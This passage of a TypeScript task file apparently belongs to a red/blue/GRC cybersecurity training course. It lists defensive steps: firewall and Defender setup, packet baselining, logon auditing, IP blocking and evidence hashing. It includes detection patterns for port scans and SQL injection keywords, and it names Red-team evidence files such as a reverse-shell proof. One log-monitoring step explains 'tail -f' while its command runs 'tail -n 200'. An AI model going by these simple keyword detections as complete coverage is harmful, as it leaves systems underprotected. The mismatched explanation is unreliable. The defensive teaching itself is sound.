        id: 'blue-w1-s6',
        title: 'Windows: Enable & Export the Firewall',
        description: 'Turn on Windows Firewall for all profiles and save its state (run in PowerShell as Administrator on the Windows host).',
        command: 'Set-NetFirewallProfile -All -Enabled True; Get-NetFirewallProfile | Out-File Windows_Firewall.txt',
        commandExplanation: '`Set-NetFirewallProfile -All -Enabled True` turns the firewall on for the Domain, Private and Public profiles; `Get-NetFirewallProfile | Out-File` saves the resulting state as evidence.',
        commandFlags: [
          { flag: 'Set-NetFirewallProfile', meaning: 'Configure the Windows Firewall profiles.' },
          { flag: '-All -Enabled True', meaning: 'Enable the firewall on every profile.' },
          { flag: 'Out-File Windows_Firewall.txt', meaning: 'Save the profile state to a file.' },
        ],
        expectedOutput: 'All three profiles show Enabled: True',
        outputExplanation: 'Open Windows_Firewall.txt — Domain/Private/Public should each read `Enabled : True`.',
        whatItMeans: 'The Windows host now blocks unsolicited inbound traffic, like UFW does on Ubuntu.',
        frameworks: ['CIS'],
        producesDeliverable: 'Windows_Firewall.txt',
        isEvidenceStep: true,
        optional: true,
        troubleshooting: '“Access denied”? You must launch PowerShell with “Run as administrator”.',
      },
      {
        id: 'blue-w1-s7',
        title: 'Windows: Defender Scan & Disable SMBv1',
        description: 'Update and scan with Microsoft Defender, and remove the legacy SMBv1 protocol.',
        command: 'Update-MpSignature; Start-MpScan -ScanType QuickScan; Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart; Get-MpComputerStatus | Out-File Defender_Status.txt',
        commandExplanation: '`Update-MpSignature` pulls the latest Defender definitions; `Start-MpScan` runs a quick scan; `Disable-WindowsOptionalFeature … SMB1Protocol` removes the unsafe SMBv1 service; `Get-MpComputerStatus` saves Defender’s state.',
        commandFlags: [
          { flag: 'Update-MpSignature', meaning: 'Update Microsoft Defender definitions.' },
          { flag: 'Start-MpScan -ScanType QuickScan', meaning: 'Run a quick antivirus scan.' },
          { flag: 'Disable-WindowsOptionalFeature … SMB1Protocol', meaning: 'Remove the legacy, exploitable SMBv1 protocol.' },
          { flag: 'Get-MpComputerStatus', meaning: 'Report Defender’s real-time status.' },
        ],
        expectedOutput: 'Defender_Status.txt shows real-time protection on; SMB1 removed',
        outputExplanation: '`AMServiceEnabled : True` and `RealTimeProtectionEnabled : True` confirm Defender is active; SMBv1 should no longer be listed as enabled.',
        whatItMeans: 'Antivirus is current and a classic wormable protocol (SMBv1) is gone.',
        frameworks: ['CIS', 'NIST_CSF'],
        producesDeliverable: 'Defender_Status.txt',
        isEvidenceStep: true,
        optional: true,
        troubleshooting: 'If SMBv1 is already removed the command is a no-op — that is fine. A reboot may be needed to fully apply.',
      }
    ]
  },
  {
    id: 'blue-w2-baseline',
    role: 'blue',
    week: 2,
    title: 'Baseline Capture & Detection Engineering (Linux + Windows)',
    objective: 'Capture normal traffic, design detection rules, and turn on Windows event logging.',
    frameworks: ['NIST_CSF', 'NIST_800_115'],
    deliverables: ['Baseline_Traffic.pcap', 'Attack_Traffic.pcap', 'Wireshark_Filters.txt', 'Detection_Rules.txt', 'Win_EventLog.txt'],
    prerequisites: ["GRC's VM_SOP.md (what to monitor and how)", 'Week 1 hardening complete on both hosts'],
    definitionOfDone: ['A clean baseline.pcap is captured', 'Detection filters written', 'Windows security/PowerShell logging is enabled and exported'],
    handoff: [{ to: 'grc', artifact: 'Detection_Rules.txt', note: 'Report the detections now in place for the VM SOP.' }],
    learn: ['Packet capture & baselining with tcpdump/Wireshark', 'Writing detection filters', 'Enabling & reading Windows Event Logs (Sysmon/PowerShell)'],
    tools: ['tcpdump', 'Wireshark', 'Windows Event Viewer', 'PowerShell (Get-WinEvent)'],
    steps: [
      {
        id: 'blue-w2-s1',
        title: 'Capture Normal Traffic',
        description: 'Record baseline traffic while accessing application normally.',
        command: 'mkdir -p ~/team-artifacts/week-2 && sudo tcpdump -i eth0 -w ~/team-artifacts/week-2/Baseline_Traffic.pcap',
        commandExplanation: '`tcpdump` captures network packets; `-i eth0` selects the interface to sniff and `-w baseline.pcap` writes raw packets to a file (instead of printing them) for later analysis.',
        commandFlags: [
          { flag: 'tcpdump', meaning: 'Capture network packets.' },
          { flag: '-i eth0', meaning: 'Capture on the eth0 interface.' },
          { flag: '-w ~/team-artifacts/week-2/Baseline_Traffic.pcap', meaning: 'Write raw packets to the canonical baseline file.' },
        ],
        expectedOutput: 'PCAP file with normal HTTP requests',
        outputExplanation: 'It prints `listening on eth0...` and a rising packet count; stop with Ctrl-C — the resulting `baseline.pcap` holds your normal-traffic sample.',
        whatItMeans: 'Establishes pattern of legitimate traffic for comparison.',
        frameworks: ['NIST_800_115'],
        producesDeliverable: 'Baseline_Traffic.pcap',
        isEvidenceStep: true
      },
      {
        id: 'blue-w2-s2',
        title: 'Analyze Baseline in Wireshark',
        description: 'Study normal traffic patterns and timing.',
        command: 'mkdir -p ~/team-artifacts/week-2 && printf "http.request\\ntcp.flags.syn==1 && tcp.flags.ack==0\\n" > ~/team-artifacts/week-2/Wireshark_Filters.txt && wireshark ~/team-artifacts/week-2/Baseline_Traffic.pcap &',
        commandExplanation: 'Opens the capture in the Wireshark GUI (the `&` frees your terminal); typing `http.request` in the display-filter bar shows only outbound HTTP requests.',
        commandFlags: [
          { flag: 'wireshark baseline.pcap', meaning: 'Open the capture in the GUI analyzer.' },
          { flag: '&', meaning: 'Run it in the background so the terminal is free.' },
          { flag: 'http.request', meaning: 'Display filter: show only HTTP requests.' },
        ],
        expectedOutput: 'Sequential requests, normal request rate, complete handshakes',
        outputExplanation: 'You should see steady, evenly-spaced requests and complete TCP handshakes (SYN, SYN-ACK, ACK) — this is what "normal" looks like for later comparison.',
        whatItMeans: 'Understand what normal looks like to detect anomalies.',
        frameworks: ['NIST_CSF'],
        producesDeliverable: 'Wireshark_Filters.txt',
        isEvidenceStep: true
      },
      {
        id: 'blue-w2-s3',
        title: 'Create Detection Filters',
        description: 'Write Wireshark filters for common attack patterns.',
        command: 'echo "Filter 1: tcp.flags.syn==1 && tcp.flags.ack==0 (SYN scan)" > ~/team-artifacts/week-2/Detection_Rules.txt',
        commandExplanation: '`echo ... > ~/team-artifacts/week-2/Detection_Rules.txt` saves a Wireshark display filter to the canonical file; `tcp.flags.syn==1 && tcp.flags.ack==0` matches lone SYN packets — the signature of a port scan.',
        commandFlags: [
          { flag: 'tcp.flags.syn==1', meaning: 'Match packets with the SYN flag set.' },
          { flag: 'tcp.flags.ack==0', meaning: '…and the ACK flag clear — a lone SYN means a scan.' },
          { flag: '> ~/team-artifacts/week-2/Detection_Rules.txt', meaning: 'Save the detection rule to the canonical file.' },
        ],
        expectedOutput: 'List of Wireshark filters',
        outputExplanation: 'No screen output; `cat ~/team-artifacts/week-2/Detection_Rules.txt` confirms the rule is saved, ready to paste into Wireshark during an attack.',
        whatItMeans: 'Filters enable rapid identification of suspicious activity.',
        frameworks: ['NIST_CSF'],
        producesDeliverable: 'Detection_Rules.txt',
        isEvidenceStep: true
      },
      {
        id: 'blue-w2-s4',
        title: 'Windows: Enable & Export Security Logging',
        description: 'Turn on auditing of logon events and export recent security logs (PowerShell as Administrator on the Windows host).',
        command: 'auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable; Get-WinEvent -LogName Security -MaxEvents 50 | Format-Table TimeCreated,Id,Message -Auto | Out-File Win_EventLog.txt',
        commandExplanation: '`auditpol /set` turns on auditing for successful and failed logons; `Get-WinEvent -LogName Security` reads the most recent 50 Security events and `Out-File` saves them as your baseline.',
        commandFlags: [
          { flag: 'auditpol /set /category:"Logon/Logoff"', meaning: 'Audit logon successes and failures.' },
          { flag: 'Get-WinEvent -LogName Security', meaning: 'Read the Windows Security event log.' },
          { flag: '-MaxEvents 50', meaning: 'Take the 50 most recent events.' },
          { flag: 'Out-File Win_EventLog.txt', meaning: 'Save the events to a file.' },
        ],
        expectedOutput: 'Win_EventLog.txt with recent logon events (Event ID 4624/4625)',
        outputExplanation: 'Event ID 4624 = successful logon, 4625 = failed logon. Capturing these now means Red’s brute-force attempts will show up next week.',
        whatItMeans: 'Windows now records who logs in (and who fails), the basis for detection.',
        frameworks: ['NIST_CSF', 'NIST_800_115'],
        producesDeliverable: 'Win_EventLog.txt',
        isEvidenceStep: true,
        optional: true,
        troubleshooting: 'No events? Generate one by logging off/on, then re-run the Get-WinEvent line.',
      },
      {
        id: 'blue-w2-s5',
        title: 'Capture a Labeled Attack Sample',
        description: 'Record a short capture while generating scan/login noise, to keep alongside the baseline.',
        instruction: 'Start a capture, run a quick nmap/login against your own host, then let it stop.',
        command: 'mkdir -p ~/team-artifacts/week-2 && sudo tcpdump -i eth0 -c 200 -w ~/team-artifacts/week-2/Attack_Traffic.pcap',
        commandExplanation: '`tcpdump -c 200` captures 200 packets to Attack_Traffic.pcap so you have an abnormal sample to compare against the baseline.',
        commandFlags: [
          { flag: '-c 200', meaning: 'Capture 200 packets then stop automatically.' },
          { flag: '-w ~/team-artifacts/week-2/Attack_Traffic.pcap', meaning: 'Write the sample to the canonical file.' },
        ],
        expectedOutput: 'Attack_Traffic.pcap created',
        outputExplanation: 'A `.pcap` of ~200 packets appears; opened in Wireshark it should show the scan/login noise your filters target.',
        whatItMeans: 'Gives you an abnormal-traffic reference so detection filters can be validated before the real attack.',
        frameworks: ['NIST_800_115'],
        producesDeliverable: 'Attack_Traffic.pcap',
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'blue-w3-detection',
    role: 'blue',
    week: 3,
    title: 'Live Detection & Response (Linux + Windows)',
    objective: 'Detect attacks as they happen on both hosts and respond with containment per the IR runbook.',
    frameworks: ['NIST_CSF', 'NIST_800_61'],
    deliverables: ['Attack_Pcap.pcap', 'Attack_Logs.txt', 'Containment_Actions.txt', 'Win_Detection.txt'],
    prerequisites: ["GRC's IR_Runbook.md (follow it during the breach)", 'Capture/logging from Week 2 running on both hosts'],
    definitionOfDone: ['Attack traffic captured', 'SQL-injection attempt detected in Linux logs', 'Windows failed-logon spike detected', 'Attacker contained on both hosts'],
    handoff: [{ to: 'grc', artifact: 'Incident_Response.txt', note: 'Submit IR notes and logs for chain of custody.' }],
    learn: ['Live triage from packets and logs', 'Detecting brute force on Windows (Event ID 4625)', 'Containment on Linux (UFW) and Windows (firewall rule)'],
    tools: ['tcpdump', 'tail/grep', 'PowerShell (Get-WinEvent)', 'Windows Firewall'],
    steps: [
      {
        id: 'blue-w3-s1',
        title: 'Start Live Packet Capture',
        description: 'Begin recording before Red starts attacks.',
        command: 'mkdir -p ~/team-artifacts/week-3 && sudo tcpdump -i eth0 -w ~/team-artifacts/week-3/Attack_Pcap.pcap',
        commandExplanation: 'Same packet capture as the baseline, started *before* the Red team attacks so every malicious packet is recorded to `attack_capture.pcap`.',
        commandFlags: [
          { flag: 'tcpdump', meaning: 'Capture network packets.' },
          { flag: '-i eth0', meaning: 'Capture on the eth0 interface.' },
          { flag: '-w ~/team-artifacts/week-3/Attack_Pcap.pcap', meaning: 'Write packets to the canonical attack-capture file.' },
        ],
        expectedOutput: 'Capture running, file growing',
        outputExplanation: '`listening on eth0` plus a climbing packet count means it is recording; verify the `.pcap` file size grows as traffic arrives.',
        whatItMeans: 'Forensic evidence collection; chain of custody begins.',
        frameworks: ['NIST_800_61'],
        producesDeliverable: 'Attack_Pcap.pcap',
        isEvidenceStep: true
      },
      {
        id: 'blue-w3-s2',
        title: 'Monitor Logs in Real Time',
        description: 'Watch system and web server logs.',
        command: 'mkdir -p ~/team-artifacts/week-3 && tail -n 200 /var/log/apache2/access.log | tee ~/team-artifacts/week-3/Attack_Logs.txt',
        commandExplanation: '`tail -f` prints the end of the Apache access log and then *follows* it, streaming each new request live as it is written.',
        commandFlags: [
          { flag: 'tail', meaning: 'Show the end of a file.' },
          { flag: '-f', meaning: 'Follow — stream new lines as they are written.' },
          { flag: '/var/log/apache2/access.log', meaning: 'The Apache request log to watch.' },
        ],
        expectedOutput: 'HTTP requests, errors, failed auth attempts',
        outputExplanation: 'Each line is one HTTP request (IP, time, method, URL, status). A burst of requests or repeated 401/404s flags attacker activity in real time.',
        whatItMeans: 'Real-time visibility into attacker activity.',
        frameworks: ['NIST_CSF'],
        producesDeliverable: 'Attack_Logs.txt',
        isEvidenceStep: true
      },
      {
        id: 'blue-w3-s3',
        title: 'Detect SQL Injection Pattern',
        description: 'Identify SQL injection attempt in logs.',
        command: 'grep -i "union\\|select" /var/log/apache2/access.log',
        commandExplanation: '`grep -i` searches the log case-insensitively; the pattern `union\\|select` matches either SQL keyword, surfacing requests that look like SQL injection.',
        commandFlags: [
          { flag: 'grep', meaning: 'Search text for a pattern.' },
          { flag: '-i', meaning: 'Case-insensitive match.' },
          { flag: 'union\\|select', meaning: 'Match either SQL keyword (\\| means OR).' },
        ],
        expectedOutput: 'SQL keywords in request URLs',
        outputExplanation: 'Any matching line contains `UNION`/`SELECT` inside a URL — legitimate users never send SQL, so these confirm an injection attempt and give you the attacker IP.',
        whatItMeans: 'Confirms SQL injection attack attempt. Write up the incident in the Incident Report form.',
        frameworks: ['OWASP', 'NIST_800_61'],
        usesForm: 'Incident Report',
        isEvidenceStep: true
      },
      {
        id: 'blue-w3-s4',
        title: 'Block Attacker IP',
        description: 'Use firewall to deny further traffic from attacker.',
        command: 'sudo ufw deny from 10.10.10.x && echo "$(date +%F\\ %T) Blocked 10.10.10.x via UFW after SQLi/brute force" >> ~/team-artifacts/week-3/Containment_Actions.txt',
        commandExplanation: '`ufw deny from <ip>` inserts a firewall rule that drops all traffic from the attacker address — an immediate containment action.',
        commandFlags: [
          { flag: 'ufw deny from', meaning: 'Add a rule that drops all traffic from an address.' },
          { flag: '10.10.10.x', meaning: 'The attacker IP to block.' },
        ],
        expectedOutput: 'UFW rule added',
        outputExplanation: '`Rule added` confirms it; `ufw status` now lists a DENY entry for that IP and the attacker requests stop appearing in the logs.',
        whatItMeans: 'Containment action stops ongoing attacks.',
        frameworks: ['NIST_800_61'],
        producesDeliverable: 'Containment_Actions.txt',
        isEvidenceStep: true
      },
      {
        id: 'blue-w3-s5',
        title: 'Windows: Detect Brute Force & Contain',
        description: 'Spot the failed-logon spike on Windows and block the source (PowerShell as Administrator).',
        command: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4625} -MaxEvents 20 | Out-File Win_Detection.txt; New-NetFirewallRule -DisplayName "Block Attacker" -Direction Inbound -RemoteAddress <ATTACKER_IP> -Action Block',
        commandExplanation: '`Get-WinEvent … Id=4625` pulls failed-logon events (the signature of a brute force) and saves them; `New-NetFirewallRule … -Action Block` then drops all traffic from the attacker IP.',
        commandFlags: [
          { flag: 'Id=4625', meaning: 'Filter to "failed logon" security events.' },
          { flag: 'Out-File Win_Detection.txt', meaning: 'Save the detected events as evidence.' },
          { flag: 'New-NetFirewallRule … -Action Block', meaning: 'Create a firewall rule that blocks the attacker IP.' },
        ],
        expectedOutput: 'Win_Detection.txt lists repeated 4625 events; firewall rule created',
        outputExplanation: 'Many 4625 events from one IP in a short window = a brute-force attempt; the new Block rule stops further attempts from that address.',
        whatItMeans: 'You detected and contained the attack on the Windows host, mirroring the Linux response.',
        frameworks: ['NIST_CSF', 'NIST_800_61'],
        producesDeliverable: 'Win_Detection.txt',
        isEvidenceStep: true,
        optional: true,
        troubleshooting: 'No 4625 events? Confirm logon auditing was enabled in Week 2 (blue-w2-s4) and that Red has started the brute force.',
      }
    ]
  },
  {
    id: 'blue-w4-response',
    role: 'blue',
    week: 4,
    title: 'Incident Response Findings',
    objective: 'Present detection engineering and response actions.',
    frameworks: ['NIST_800_61', 'NIST_CSF'],
    deliverables: [],
    prerequisites: ['Week 3 detection & response notes', 'IR runbook outcomes'],
    definitionOfDone: ['Detection summary written', 'Response timeline built', 'Your briefing slides drafted'],
    handoff: [{ to: 'grc', artifact: 'Detection_Summary.md', note: 'Feed detection/response results into the final report.' }],
    learn: ['Summarizing detection engineering', 'Building an incident timeline'],
    tools: ['Markdown', 'Slides'],
    steps: [
      {
        id: 'blue-w4-s1',
        title: 'Compile Detection Evidence',
        description: 'Document what you detected and when.',
        instruction: 'Record your detections and their timing in the Incident Report form.',
        whatItMeans: 'Shows detection capability and speed of response.',
        frameworks: ['NIST_800_61'],
        usesForm: 'Incident Report',
      },
      {
        id: 'blue-w4-s2',
        title: 'Build the Response Timeline',
        description: 'Build the response timeline.',
        instruction: 'Lay out your detect, contain and recover timeline in the Incident Report form.',
        whatItMeans: 'Demonstrates how fast you moved from detection to containment.',
        frameworks: ['NIST_800_61'],
        usesForm: 'Incident Report',
      },
      {
        id: 'blue-w4-s3',
        title: 'Draft Your Briefing Slides',
        description: 'Prepare your briefing slides.',
        instruction: 'Build a few briefing slides from your Incident Report — what you saw and how you responded.',
        whatItMeans: 'Your half of the final briefing is ready to combine into the team deck.',
        frameworks: ['NIST_CSF'],
      }
    ]
  }
];

// GRC (Fixers) Tasks
const GRC_TASKS: Task[] = [
  {
    id: 'grc-w0-setup',
    role: 'grc',
    week: 0,
    title: 'Open the Policy Workspace & Authorize the Engagement',
    objective: 'Set up where your company stores artifacts and put the authorized scope in writing for Red and Blue.',
    frameworks: ['ISO_27001', 'NIST_CSF'],
    deliverables: [],
    learn: ['Organizing a shared evidence workspace', 'What an authorization memo / Rules of Engagement is', 'Coordinating Red and Blue as the responsible role'],
    tools: ['Markdown editor', 'mkdir / shared folder'],
    prerequisites: ['Authorization + target list (from the instructor)'],
    definitionOfDone: ['A team-artifacts folder structure exists', 'Authorized scope is written down', 'Red and Blue both received the scope'],
    handoff: [
      { to: 'red', artifact: 'Rules_of_Engagement.md', note: 'Send the authorized scope before any scanning.' },
      { to: 'blue', note: 'Tell Blue which two systems (Ubuntu + Windows) to harden.' },
    ],
    steps: [
      {
        id: 'grc-w0-s1',
        title: 'Create the Shared Workspace',
        description: 'Create the canonical per-week folders where every team artifact lives.',
        instruction: 'Create the five week folders under your home directory.',
        command: 'mkdir -p ~/team-artifacts/{week-0,week-1,week-2,week-3,week-4}',
        commandExplanation: '`mkdir -p` creates `~/team-artifacts/` plus the five week subfolders in one pass via brace expansion.',
        expectedOutput: 'Folders created (no output on success)',
        outputExplanation: 'Run `ls ~/team-artifacts/` to confirm week-0…week-4 exist.',
        whatItMeans: 'Gives every teammate one predictable drop-off path (`~/team-artifacts/week-N/`) so files never get lost or duplicated.',
        frameworks: ['ISO_27001'],
        troubleshooting: 'Permission denied? Confirm you are writing under `~/` (your home), not a system path.',
      },
      {
        id: 'grc-w0-s2',
        title: 'Draft the Rules of Engagement',
        description: 'Put the authorized scope in writing.',
        instruction: 'Write the authorized scope in the Scope and Rules of Engagement form, then share it with Red and Blue.',
        whatItMeans: 'Sets the legal boundary Red may attack and Blue must defend.',
        frameworks: ['ISO_27001', 'NIST_CSF'],
        usesForm: 'Scope & Rules of Engagement',
      },
    ],
  },
  {
    id: 'grc-w1-framework',
    role: 'grc',
    week: 1,
    title: 'Framework Mapping & Hardening Standard',
    objective: 'Log Week 1 artifacts into the chain-of-custody register, map them to NIST CSF + CIS, and issue a Hardening Standard to Blue.',
    frameworks: ['NIST_CSF', 'CIS', 'STRIDE'],
    deliverables: [],
    prerequisites: ["Red's Asset_List.md and Recon_Findings.md", "Blue's Hardening_Checklist.txt and UFW_Status.txt", 'Your Rules_of_Engagement.md from Week 0'],
    definitionOfDone: ['All four Week 1 files logged + hashed in Artifact_Register.md', 'Findings mapped to NIST CSF + CIS in Framework_Mapping.md', 'Lab_Security_Policy_v1.0.md drafted', 'Hardening_Standard.md handed to Blue'],
    handoff: [
      { to: 'blue', artifact: 'Hardening_Standard.md', note: 'The OS-specific controls Blue must implement on both hosts.' },
      { to: 'red', artifact: 'Rules_of_Engagement.md', note: 'Reconfirm Week 2 scanning stays within authorized scope.' },
    ],
    learn: ['Turning controls into policy with NIST CSF & CIS', 'Writing an actionable Hardening Standard (SOP)', 'How GRC drives Blue/Red instead of just reporting'],
    tools: ['NIST CSF', 'CIS Controls', 'Markdown'],
    steps: [
      {
        id: 'grc-w1-s1',
        title: 'Gather & log Week 1 artifacts',
        description: 'Gather the Week 1 work from your teammates.',
        instruction: 'Confirm Red and Blue dropped their Week 1 files, then enter the discovered assets into the Asset Inventory form.',
        whatItMeans: 'Brings the team Week 1 work together and starts the asset inventory.',
        frameworks: ['NIST_CSF', 'ISO_27001'],
        usesForm: 'Asset Inventory',
      },
      {
        id: 'grc-w1-s2',
        title: 'Map findings to NIST CSF',
        description: 'Map findings to NIST CSF controls.',
        instruction: 'Note which NIST CSF control each finding satisfies — you will cite these in the Risk Register and Final Report.',
        whatItMeans: 'Turns raw findings into a control-by-control audit trail.',
        frameworks: ['NIST_CSF'],
      },
      {
        id: 'grc-w1-s3',
        title: 'Append CIS Control rows',
        description: 'Map findings to CIS Controls.',
        instruction: 'Add the matching CIS Controls to your notes so coverage gaps are obvious.',
        whatItMeans: 'Cross-references the same evidence against a second framework.',
        frameworks: ['CIS'],
      },
      {
        id: 'grc-w1-s4',
        title: 'Draft Security Policy v1.0',
        description: 'Set the baseline policy.',
        instruction: 'Capture your baseline rules (no root SSH, firewall on, logging) — they anchor the Scope and Final Report.',
        whatItMeans: 'Converts the framework mapping into enforceable rules every host must meet.',
        frameworks: ['ISO_27001'],
      },
      {
        id: 'grc-w1-s5',
        title: 'Write the Hardening Standard for Blue',
        description: 'Tell Blue which controls to apply.',
        instruction: 'Tell Blue exactly which controls to apply — Blue records them in the Hardening Baseline form.',
        whatItMeans: 'GRC sets the standard; Blue implements it.',
        frameworks: ['CIS', 'NIST_CSF'],
      }
    ]
  },
  {
    id: 'grc-w2-risk',
    role: 'grc',
    week: 2,
    title: 'Risk Assessment & Vulnerability-Management SOP',
    objective: 'Score the risks and write the Vulnerability-Management SOP your Blue team follows to remediate.',
    frameworks: ['NIST_CSF', 'CVSS'],
    deliverables: [],
    prerequisites: ["Red's Vulnerability_Summary.md (the findings)", 'Your Week 1 Hardening Standard'],
    definitionOfDone: ['Risk matrix built', 'CVSS scores assigned', 'VM SOP written and handed to Blue with remediation priorities'],
    handoff: [{ to: 'blue', artifact: 'VM_SOP.md', note: 'Remediation order and process Blue follows.' }],
    learn: ['Likelihood × Impact risk scoring', 'CVSS severity', 'Writing a Vulnerability-Management SOP from a framework'],
    tools: ['CVSS', 'NIST CSF', 'Markdown'],
    steps: [
      {
        id: 'grc-w2-s1',
        title: 'Collect Vulnerability Data',
        description: 'Gather the Week 2 findings.',
        instruction: 'Confirm Red dropped the Week 2 scan findings, then open the Risk Register form.',
        whatItMeans: 'Brings the scan findings in before they drive risk decisions.',
        frameworks: ['NIST_CSF', 'ISO_27001'],
        usesForm: 'Risk Register',
      },
      {
        id: 'grc-w2-s2',
        title: 'Create Risk Matrix',
        description: 'Score each risk.',
        instruction: 'Score each risk (likelihood by impact) in the Risk Register form — the rating is computed for you.',
        whatItMeans: 'Prioritizes risks for remediation.',
        frameworks: ['NIST_CSF'],
        usesForm: 'Risk Register',
      },
      {
        id: 'grc-w2-s3',
        title: 'Assign CVSS Scores',
        description: 'Add CVSS severities.',
        instruction: 'Add a CVSS severity to each finding in the Risk Register form.',
        whatItMeans: 'Standardized severity helps prioritization.',
        frameworks: ['CVSS'],
        usesForm: 'Risk Register',
      },
      {
        id: 'grc-w2-s4',
        title: 'Write the Vulnerability-Management SOP for Blue',
        description: 'Hand Blue the remediation order.',
        instruction: 'Give Blue the remediation order (highest risk first) so they know what to fix and when.',
        whatItMeans: 'GRC defines the remediation process; Blue carries it out.',
        frameworks: ['NIST_CSF', 'CVSS'],
      }
    ]
  },
  {
    id: 'grc-w3-custody',
    role: 'grc',
    week: 3,
    title: 'Incident-Response Runbook & Chain of Custody',
    objective: 'Issue the IR runbook your Blue team follows during the breach, then preserve the evidence with chain of custody.',
    frameworks: ['NIST_800_61', 'ISO_27001'],
    deliverables: ['Evidence_Hashes.txt'],
    prerequisites: ['Week 2 VM SOP issued', "Blue's detections from Week 2 in place"],
    definitionOfDone: ['IR runbook handed to Blue before the attack', 'All evidence hashed and logged', 'Chain of custody intact'],
    handoff: [{ to: 'blue', artifact: 'IR_Runbook.md', note: 'The steps Blue follows the moment an attack is detected.' }],
    learn: ['Writing an incident-response runbook (NIST 800-61)', 'Evidence hashing & chain of custody', 'Coordinating the company during an incident'],
    tools: ['NIST 800-61', 'sha256sum', 'Markdown'],
    steps: [
      {
        id: 'grc-w3-s5',
        title: 'Write the IR Runbook for Blue (do this first)',
        description: 'Give Blue the incident-response steps.',
        instruction: 'Give Blue the incident-response steps to follow during the attack (detect, contain, preserve, report).',
        whatItMeans: 'GRC prepares the response plan; Blue executes it during the attack.',
        frameworks: ['NIST_800_61'],
      },
      {
        id: 'grc-w3-s1',
        title: 'Receive Artifacts from Team',
        description: 'Receive the attack evidence from the team.',
        instruction: 'Confirm Red and Blue dropped their Week 3 evidence, then open the Incident Report form to log it.',
        whatItMeans: 'Brings every attack artifact under chain of custody as it arrives.',
        frameworks: ['NIST_800_61'],
        usesForm: 'Incident Report',
      },
      {
        id: 'grc-w3-s2',
        title: 'Hash Evidence Files',
        description: 'Create SHA256 hashes for integrity verification.',
        command: 'cd ~/team-artifacts/week-3 && sha256sum Attack_Pcap.pcap Attack_Logs.txt SQL_Injection_Proof.txt Brute_Force_Proof.txt Reverse_Shell_Proof.txt Evidence_Photos.zip > Evidence_Hashes.txt',
        commandExplanation: '`sha256sum` fingerprints each real attack artifact; `> Evidence_Hashes.txt` stores the hashes so any later change is detectable.',
        commandFlags: [
          { flag: 'sha256sum', meaning: 'Compute a SHA-256 fingerprint of each file.' },
          { flag: '> Evidence_Hashes.txt', meaning: 'Save the hashes to the canonical file for integrity checks.' },
        ],
        expectedOutput: 'Hash file created',
        outputExplanation: 'The file holds a 64-character hash next to each filename; re-running the command later must produce identical hashes to prove nothing was altered.',
        whatItMeans: 'Proves evidence has not been tampered with.',
        frameworks: ['NIST_800_61'],
        producesDeliverable: 'Evidence_Hashes.txt',
        isEvidenceStep: true
      },
      {
        id: 'grc-w3-s3',
        title: 'Create Evidence Log',
        description: 'Log each piece of evidence.',
        instruction: 'Record each artifact (who collected it, when, and its hash) in the Incident Report evidence log.',
        whatItMeans: 'A defensible chain of custody for forensics.',
        frameworks: ['NIST_800_61'],
        usesForm: 'Incident Report',
      },
      {
        id: 'grc-w3-s4',
        title: 'Sign the Chain of Custody',
        description: 'Confirm the chain of custody.',
        instruction: 'Confirm the chain of custody in the Incident Report form — hashes plus who held the evidence.',
        whatItMeans: 'Completes the chain of custody so the evidence holds up under scrutiny.',
        frameworks: ['ISO_27001', 'NIST_800_61'],
        usesForm: 'Incident Report',
      },
      {
        id: 'grc-w3-s6',
        title: 'Summarize the Incident Findings',
        description: 'Summarize the incident findings.',
        instruction: 'Summarize what the breach proved, ranked by severity — this feeds the Final Report.',
        whatItMeans: 'Gives the Final Report an evidence-backed, ranked findings list.',
        frameworks: ['NIST_800_61', 'ISO_27001'],
      }
    ]
  },
  {
    id: 'grc-w4-report',
    role: 'grc',
    week: 4,
    title: 'Final Report & Presentation',
    objective: 'Compile and present all findings, recommendations, and incident response.',
    frameworks: ['ISO_27001', 'NIST_CSF'],
    deliverables: [],
    prerequisites: ["Red's and Blue's Week 4 briefings", 'All prior SOPs, risk register, and evidence'],
    definitionOfDone: ['Findings + recommendations compiled', 'Final report PDF produced', 'Team slides assembled'],
    handoff: [
      { to: 'red', note: 'Confirm the findings are technically accurate.' },
      { to: 'blue', note: 'Confirm the response timeline is accurate.' },
    ],
    learn: ['Compiling a professional security report', 'Synthesizing Red + Blue + GRC work', 'Writing executive recommendations'],
    tools: ['Deliverables forms', 'Markdown', 'Slides'],
    steps: [
      {
        id: 'grc-w4-s1',
        title: 'Compile Findings Document',
        description: 'Compile the findings.',
        instruction: 'Compile the findings, grouped by severity, in the Final Report and Briefing form.',
        whatItMeans: 'Aggregates all findings into one ranked list.',
        frameworks: ['ISO_27001'],
        usesForm: 'Final Report & Briefing',
      },
      {
        id: 'grc-w4-s2',
        title: 'Create Recommendations',
        description: 'Add recommendations.',
        instruction: 'Add a prioritized recommendation for each finding in the Final Report and Briefing form.',
        whatItMeans: 'Pairs each finding with an actionable fix.',
        frameworks: ['NIST_CSF'],
        usesForm: 'Final Report & Briefing',
      },
      {
        id: 'grc-w4-s3',
        title: 'Compile Final Report',
        description: 'Generate the final report.',
        instruction: 'Generate the final report from the Final Report and Briefing form (Generate, then Print or Save as PDF).',
        whatItMeans: 'Merges every section into one board-ready report.',
        frameworks: ['ISO_27001'],
        usesForm: 'Final Report & Briefing',
      },
      {
        id: 'grc-w4-s4',
        title: 'Assemble the Team Briefing Deck',
        description: 'Assemble the team briefing deck.',
        instruction: 'Assemble the team briefing deck: executive summary, Red findings, Blue response.',
        whatItMeans: 'Produces the single team briefing that ties Red, Blue and GRC together.',
        frameworks: ['ISO_27001', 'NIST_CSF'],
      }
    ]
  }
];

// Maps each evidence step to the deliverable file it contributes toward.
// Used by the guided task runner to show "this step produces <file>".
export const STEP_DELIVERABLES: Record<string, string> = {
  'red-w1-s3': 'Recon_Findings.md',
  'red-w2-s1': 'Nmap_Scan.txt',
  'red-w2-s2': 'Nikto_Report.txt',
  'red-w3-s1': 'SQL_Injection_Proof.txt',
  'red-w3-s2': 'Brute_Force_Proof.txt',
  'red-w3-s3': 'Reverse_Shell_Proof.txt',
  'red-w3-s4': 'Evidence_Photos.zip',
  'blue-w1-s3': 'UFW_Status.txt',
  'blue-w1-s5': 'Lynis_Report.txt',
  'blue-w1-s6': 'Windows_Firewall.txt',
  'blue-w1-s7': 'Defender_Status.txt',
  'blue-w2-s1': 'Baseline_Traffic.pcap',
  'blue-w2-s2': 'Wireshark_Filters.txt',
  'blue-w2-s3': 'Detection_Rules.txt',
